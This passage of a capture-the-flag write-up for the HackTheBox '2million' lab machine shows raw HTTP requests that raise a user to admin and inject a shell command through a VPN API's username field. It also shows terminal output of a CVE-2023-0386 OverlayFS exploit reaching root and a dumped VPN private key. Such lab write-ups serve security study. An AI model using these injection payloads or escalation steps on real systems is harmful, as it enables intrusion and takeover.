


We can confirm the the fact with this api request
```
GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=a219fmepo1h4mrg4gu8ufcnjb7
Connection: close
content-type: application/json
Content-Length: 54

{
	"email":"napoknot21@test.com",
    "is_admin": 1
}
```

Indeed, We are admin !
```
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 26 Aug 2023 12:02:21 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 16

{"message":true}
```

Let's exploir the `/api/v1/admin/vpn/generate` by this
```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=a219fmepo1h4mrg4gu8ufcnjb7
Connection: close
content-type: application/json
Content-Length: 32

{
	"username":"napoknot21"
}
```

We have it !
```
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 26 Aug 2023 12:05:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 10846

client
dev tun
...
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
DAgybWlsbGlvbjEhMB8GCSqGSIb3DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MB4X
...
vLMlFhVCUmrTO/zgqUOp4HTPvnRYVcqtKw3ljZyxJwjyslsHLOgJwGxooiTKwVwF
pjSzFm5eIlO2rgBUD2YvJJYyKla2n9O/3vvvSAN6n8SNtCgwFRYBM8FJsH8Jap2s
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Aug 26 12:05:58 2023 GMT
            Not After : Aug 25 12:05:58 2024 GMT
        Subject: C=GB, ST=London, L=London, O=napoknot21, CN=napoknot21
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:d0:69:4a:a3:48:75:a8:b5:8d:b3:f4:05:8e:df:
                    fe:2e:31:f8:07:4b:f2:31:c6:64:17:aa:6a:74:b5:
                    ...
                    8e:a2:4c:7d:2b:20:0f:5e:41:d6:fb:ff:72:55:89:
                    31:d5
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                32:9E:F6:22:95:80:E6:95:AC:B7:A5:53:F2:EE:20:A9:FA:4A:6D:6B
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        3e:7f:2a:a0:5e:a6:bf:29:24:23:d5:44:10:6c:c3:db:bd:f8:
        de:09:83:ac:29:94:e5:9c:29:0a:21:97:6f:c7:b6:96:5d:d1:
        ...
        f9:ab:35:94:f8:04:2f:8e:9b:45:7f:ad:2b:07:bd:2f:d9:eb:
        f8:af:b0:a1:7e:cc:0d:73
-----BEGIN CERTIFICATE-----
MIIE5zCCAs+gAwIBAgIBATANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
...
t5I6gFdFa4uljY9FuCdDTx17x6RtnJg33Lp3XniLK0Mb+as1lPgEL46bRX+tKwe9
L9nr+K+woX7MDXM=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDQaUqjSHWotY2z
9AWO3/4uMfgHS/IxxmQXqmp0tc6Ix31FRr1cnt/fweKJvt15fI9XXnwHiIfTMKDV
...
TkY0FnCz6Ly0p4+l+SLSTs7DDhZ5802JWC4HT1OiPRtNq13RCWMBqRJrkAVMve7/
uJKgxqc0UX5rqvQ4XpD30Upr
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
...
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>
```

Let's try to inject somme commands
```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=a219fmepo1h4mrg4gu8ufcnjb7
Connection: close
content-type: application/json
Content-Length: 41

{
	"username":"napoknot21; ls -la;"
}

```

We can read files !
```
<BS>HTTP/1.1 200 OK
Server: nginx
Date: Sat, 26 Aug 2023 12:14:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 690

total 56
drwxr-xr-x 10 root root 4096 Aug 26 12:10 .
drwxr-xr-x  3 root root 4096 Jun  6 10:22 ..
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  5 root root 4096 Aug 26 12:10 VPN
drwxr-xr-x  2 root root 4096 Jun  6 10:22 assets
drwxr-xr-x  2 root root 4096 Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4096 Jun  6 10:22 css
drwxr-xr-x  2 root root 4096 Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4096 Jun  6 10:22 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  6 10:22 js
drwxr-xr-x  2 root root 4096 Jun  6 10:22 views
```

That means we can send a rev shell !
```
Lorem ipsum dolor sit amet, qui minim labore adipisicing minim sint cillum sint consectetur cupidatat.
```


We connect to the 
```
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Aug 26 12:31:04 PM UTC 2023

  System load:           0.0
  Usage of /:            89.1% of 4.82GB
  Memory usage:          11%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.221
  IPv6 address for eth0: dead:beef::250:56ff:feb9:b989

  => / is using 89.1% of 4.82GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Sat Aug 26 12:27:21 2023 from 10.10.16.71
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$
```

Let's keep this message for Later
```
You have mail.
Last login: Sat Aug 26 12:27:21 2023 from 10.10.16.71
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

Let's check the mail in the ```/var/mail/admin``` file 
```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Them mail comes from ```ch4p@2million.htb``` (could be a potential mail). Also, there's ```g0blin@2million.htb``` The message talks about a kernel CVE !

In one terminal we have this
```
[+] len of gc: 0x3ee0
mkdir: File exists
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```

And in the othe one we have this
```
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Aug 26 12:41 .
drwxr-xr-x 6 root   root     4096 Aug 26 10:13 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386#
```

We are root !
